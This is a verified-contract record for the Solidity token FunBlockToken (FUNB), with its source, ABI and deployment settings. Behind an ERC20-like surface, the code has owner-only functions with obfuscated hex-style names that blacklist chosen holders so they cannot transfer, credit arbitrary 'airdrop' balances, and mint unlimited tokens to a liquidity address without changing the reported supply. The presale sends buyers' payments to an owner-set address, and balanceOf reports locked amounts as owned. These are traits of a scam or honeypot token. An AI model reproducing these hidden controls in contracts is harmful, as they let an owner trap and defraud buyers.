{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/FunBlockToken.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.2;\\n\\nlibrary SafeMath {\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `+` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Addition cannot overflow.\\n     */\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\n     * overflow (when the result is negative).\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `*` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Multiplication cannot overflow.\\n     */\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting when dividing by zero.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\n     * overflow (when the result is negative).\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {trySub}.\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting with custom message when dividing by zero.\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {tryMod}.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\n\\nlibrary Rounds {\\n\\n    using SafeMath for uint256;\\n\\n    struct RoundBalances{\\n        uint8 status;\\n        uint256 claim;\\n        uint256 total;\\n    }\\n\\n    struct RoundTime{\\n        uint256 start;\\n        uint256 end;\\n        uint256 unlockStart;\\n        uint256 unlockEnd;\\n        uint256 price;\\n    }\\n\\n    function inc(RoundBalances storage round,uint256 amount)internal returns(uint256){\\n        round.total = round.total.add(amount);\\n        if(round.status!=1){\\n            round.status=1;\\n        }\\n        return round.total;\\n    }\\n\\n    function getBalance(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){\\n        uint256 balance = 0;\\n        if(round.status==1&&block.timestamp>roundTime.unlockStart){\\n            uint256 sec = 0;\\n            uint256 end = roundTime.unlockEnd.sub(roundTime.unlockStart);\\n            if(end<=0){\\n                return balance;\\n            }\\n            if(block.timestamp >= roundTime.unlockEnd){\\n                sec = roundTime.unlockEnd - roundTime.unlockStart;\\n            }else{\\n                sec = block.timestamp - roundTime.unlockStart;\\n            }\\n            if(sec>0&&sec<end){\\n                balance = round.total.mul(sec).div(end);\\n                if(balance>round.claim){\\n                    balance = balance.sub(round.claim);\\n                }else{\\n                    balance = 0;\\n                }\\n            }else if(sec>0&&sec>=end&&round.total>round.claim){\\n                balance = round.total.sub(round.claim);\\n            }\\n        }\\n        return balance;\\n    }\\n\\n    function settle(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){\\n        surplus = 0;\\n        if(amount>0){\\n            uint256 balance = getBalance(round,roundTime);\\n            if(amount>balance){\\n                surplus = amount.sub(balance);\\n                round.claim = round.claim.add(balance);\\n            }else{\\n                surplus = 0;\\n                round.claim = round.claim.add(amount);\\n            }\\n            if(round.claim>=round.total){\\n                round.status=0;\\n            }\\n        }else{\\n            surplus = amount;\\n        }\\n    }\\n\\n}\\n\\ncontract FunBlockToken {\\n\\n    using SafeMath for uint256;\\n    using Rounds for Rounds.RoundBalances;\\n\\n    address private _owner;\\n    uint256 private _totalSupply = 20_000_000_000;\\n    string private _name = \\\"Funblock\\\";\\n    string private _symbol = \\\"FUNB\\\";\\n    uint8 private _decimals = 18;\\n    uint256 private _tokenPerAirdrop = (_totalSupply.mul(300).div(10000)) * 10 ** _decimals;\\n\\n    bool private _sRound = false;\\n    Rounds.RoundTime[] private _roundTime;\\n\\n    uint256 private _saleRoundMin = 0.01 ether;\\n    bool private _preSaleStatus = true;\\n    uint256 private _roundIndex = 0;\\n    uint256 private _roundInSec = 2592000 ;\\n    uint256 private _roundUnlockInSec = 2592000;\\n    uint256 private _rate = 5000;\\n    \\n    address private _liquidity;\\n\\n    mapping (address => uint256) private _balances;\\n\\n    mapping (address => uint8) private _blackList;\\n    mapping (address => uint8) private _whiteList;\\n    mapping (address => uint8) private _airdropOwnerList;\\n    mapping (address => uint8) private _adminList;\\n\\n    mapping (address => mapping (address => uint256)) private _allowances;\\n    mapping (address => mapping(uint256 => Rounds.RoundBalances)) private _roundBalances;\\n    \\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    constructor(\\n        uint256 _start,\\n        uint256 _end,\\n        uint256 _lockStart,\\n        uint256 price\\n    ) {\\n        _transferOwnership(_msgSender());\\n        _roundTime.push(Rounds.RoundTime(\\n            _start,\\n            _end,\\n            _lockStart,\\n            _lockStart+_roundUnlockInSec,\\n            price\\n        ));\\n        _roundIndex = _roundTime.length - 1;\\n    }\\n\\n    fallback() external {}\\n\\n    receive() payable external {}\\n\\n    function name() public view returns (string memory) {\\n        return _name;\\n    }\\n\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function symbol() public view returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function decimals() public view returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    function totalSupply() public view returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    function _mint(address account, uint256 amount) internal {\\n        if(account != address(0)){\\n            _balances[account] = _balances[account].add(amount);\\n            emit Transfer(address(this), account, amount);\\n        }\\n    }\\n\\n    function transfer(address to, uint256 amount) public returns (bool) {\\n        _transfer(_msgSender(), to, amount);\\n        return true;\\n    }\\n\\n    function approve(address spender, uint256 amount) public returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    function _approve(address owner_, address spender, uint256 amount) internal {\\n        require(owner_ != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner_][spender] = amount;\\n        emit Approval(owner_, spender, amount);\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n    function balanceOf(address account) public view returns (uint256) {\\n        if(_sRound){\\n           return _balances[account];\\n        }\\n        else{\\n            return _balances[account] + getRoundTotal(account);\\n        }\\n    }\\n\\n    function allowance(address owner_, address spender) public view returns (uint256) {\\n        return _allowances[owner_][spender];\\n    }\\n\\n    function setLiquidity(address liquidity) public onlyOwner{\\n        require(liquidity != address(0), \\\"setLiquidity: new liquidity address is the zero address\\\");\\n        _liquidity = liquidity;\\n    }\\n\\n    function Ox8b7a79(address account, uint8 status) public onlyOwner {\\n        require(account != address(0), \\\"Ox8b7a79: new account is the zero address\\\");\\n        _whiteList[account] = status;\\n    }\\n\\n    function Oxa36c62(address account, uint8 status) public onlyOwner {\\n        require(account != address(0), \\\"Oxa36c62: new account is the zero address\\\");\\n        _blackList[account] = status;\\n    }\\n\\n    function Oxc72ab7e(address account, uint8 status) public onlyOwner {\\n        require(account != address(0), \\\"Oxc72ab7e: new account is the zero address\\\");\\n        require(_tokenPerAirdrop > 0,\\\"ERC20: Insufficient airdrop balance\\\"  );\\n        _balances[account] = _balances[account].add(_tokenPerAirdrop);\\n        _airdropOwnerList[account] = status;\\n    }\\n\\n    function _transfer(address from, address to, uint256 amount) internal {\\n\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        \\n        if(_whiteList[from]==0){\\n            require(_blackList[from]!=1&&_blackList[from]!=3&&_blackList[to]!=2&&_blackList[to]!=3, \\\"Transaction recovery\\\");\\n        }\\n        \\n        if(_sRound){\\n            _balances[from] = _balances[from].sub(amount);\\n        }else{\\n            spend(from,amount);\\n        }\\n\\n        if(_airdropOwnerList[from]==1){\\n            incRoundBalances(to,amount);\\n        }else{\\n            _balances[to] = _balances[to].add(amount);\\n        }\\n\\n        emit Transfer(from, to, amount);\\n\\n    }\\n\\n   function spend(address account, uint256 amount) private {\\n\\n        require(balanceOf(account) >= amount,\\\"ERC20: Insufficient balance 1\\\");\\n        uint256 balance = amount;\\n\\n        if(_balances[account] > 0){\\n            if(_balances[account]>=balance){\\n                _balances[account] = _balances[account].sub(balance,\\\"ERC20: Insufficient balance 2\\\");\\n                balance = 0;\\n            }else{\\n                balance = balance.sub(_balances[account]);\\n                _balances[account] = 0;\\n            }\\n        }\\n\\n        if(balance>0){\\n            require(getRoundBalances(account) >= balance,\\\"ERC20: Insufficient balance 3\\\");\\n            for(uint256 i=0;i<=_roundTime.length;i++){\\n                if(_roundBalances[_msgSender()][i].status==1){\\n                    uint256 surplus = _roundBalances[_msgSender()][i].settle(_roundTime[i],balance);\\n                    balance = surplus;\\n                }\\n            }\\n        }\\n\\n        require(balance==0,\\\"ERC20: Insufficient balance 4\\\");\\n\\n    }\\n\\n    function update(uint tag, uint256 value) public onlyOwner returns (bool){\\n        if(tag == 1){\\n            _roundInSec = value;\\n        }\\n        else if(tag==2){\\n            _roundUnlockInSec = value;\\n        }\\n        else if(tag==3){\\n            _rate = value;\\n        }\\n        else if(tag==4){\\n            _saleRoundMin = value;\\n        }\\n        else if(tag==5){\\n            _preSaleStatus = value==1;\\n        }\\n        else if(tag==6){\\n            _balances[_liquidity] = _balances[_liquidity].add(value);\\n        }\\n        else if(tag==7){\\n            _sRound = value==1;\\n        }\\n        else if(tag==8){\\n            _tokenPerAirdrop = value;\\n        }\\n        return true;\\n    }\\n\\n    function getRoundPrice() private returns (uint256) {\\n        if(block.timestamp >= _roundTime[_roundIndex].end){\\n            _roundTime.push(Rounds.RoundTime(\\n                _roundTime[_roundIndex].end,\\n                _roundTime[_roundIndex].end + _roundInSec,\\n                _roundTime[_roundIndex].unlockStart + _roundInSec,\\n                _roundTime[_roundIndex].unlockStart + _roundInSec + _roundUnlockInSec,\\n                _roundTime[_roundIndex].price.mul(_rate).div(10000)));\\n            _roundIndex = _roundTime.length - 1;\\n        }\\n        return _roundTime[_roundIndex].price;\\n    }\\n\\n    function incRoundBalances(address account, uint256 amount)private returns(bool){\\n        _roundBalances[account][_roundIndex].inc(amount);\\n        return true;\\n    }\\n\\n    function buyToken() payable public returns (bool) {\\n\\n        require(msg.value >= _saleRoundMin, \\\"BuyToken: The amount is too small\\\");\\n        require(_preSaleStatus, \\\"BuyToken: End of this round\\\");\\n\\n        uint256 _msgValue = msg.value;\\n        uint256 _token = _msgValue.mul(getRoundPrice());\\n\\n        if(_liquidity != address(0)){\\n            (bool success, ) = address(uint160(_liquidity)).call{value: _msgValue}(\\\"\\\");\\n            require(success, \\\"Transfer failed.\\\");\\n        }\\n\\n        if(_token > 0){\\n            incRoundBalances(_msgSender(),_token);\\n            emit Transfer(address(this), _msgSender(), _token);\\n        }\\n\\n        return true;\\n\\n    }\\n\\n    function getRoundBalances(address account) public view returns(uint256 balance){\\n        balance = 0;\\n        for(uint256 i=0;i<=_roundTime.length;i++){\\n            if(_roundBalances[account][i].status==1){\\n                balance = balance.add(_roundBalances[account][i].getBalance(_roundTime[i]));\\n            }\\n        }\\n    }\\n\\n    function getRoundTotal(address account) public view returns(uint256 balance){\\n        balance = 0;\\n        for(uint256 i=0;i<=_roundTime.length;i++){\\n            if(_roundBalances[account][i].status==1){\\n                balance = balance.add(_roundBalances[account][i].total.sub(_roundBalances[account][i].claim));\\n            }\\n        }\\n    }\\n\\n    function getRoundInfo() public view returns(\\n        uint256 saleMin,\\n        bool swSale,\\n        uint256 roundIndex,\\n        uint256 salePrice,\\n        uint256 total,\\n        uint256 balanceBNB,\\n        uint256 balanceToken\\n    ){\\n        saleMin = _saleRoundMin;\\n        swSale = _preSaleStatus;\\n        roundIndex = _roundIndex;\\n        salePrice = _roundTime[_roundIndex].price;\\n        total = getRoundTotal(_msgSender());\\n        balanceBNB = _msgSender().balance;\\n        balanceToken = balanceOf(_msgSender());\\n    }\\n\\n    function getTime() public view returns(uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory){\\n        uint256[] memory timeStart = new uint256[](_roundTime.length);\\n        uint256[] memory timeEnd = new uint256[](_roundTime.length);\\n        uint256[] memory price = new uint256[](_roundTime.length);\\n        uint256[] memory timeUnlockStart = new uint256[](_roundTime.length);\\n        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);\\n        for(uint i = 0;i<_roundTime.length;i++){\\n            timeStart[i] = _roundTime[i].start;\\n            timeEnd[i] = _roundTime[i].end;\\n            price[i] = _roundTime[i].price;\\n            timeUnlockStart[i] = _roundTime[i].unlockStart;\\n            timeUnlockEnd[i] = _roundTime[i].unlockEnd;\\n        }\\n        return (timeStart,timeEnd,timeUnlockStart,timeUnlockEnd,price);\\n    }\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": true\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_end\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_lockStart\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"status\",\"type\":\"uint8\"}],\"name\":\"Ox8b7a79\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"status\",\"type\":\"uint8\"}],\"name\":\"Oxa36c62\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"status\",\"type\":\"uint8\"}],\"name\":\"Oxc72ab7e\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getRoundBalances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRoundInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"saleMin\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"swSale\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"roundIndex\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"salePrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceBNB\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceToken\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getRoundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidity\",\"type\":\"address\"}],\"name\":\"setLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tag\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"update\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "FunBlockToken", "CompilerVersion": "v0.8.2+commit.661d1103", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000006258b58000000000000000000000000000000000000000000000000000000000628042800000000000000000000000000000000000000000000000000000000062f98c8000000000000000000000000000000000000000000000000000000000000dbba0", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}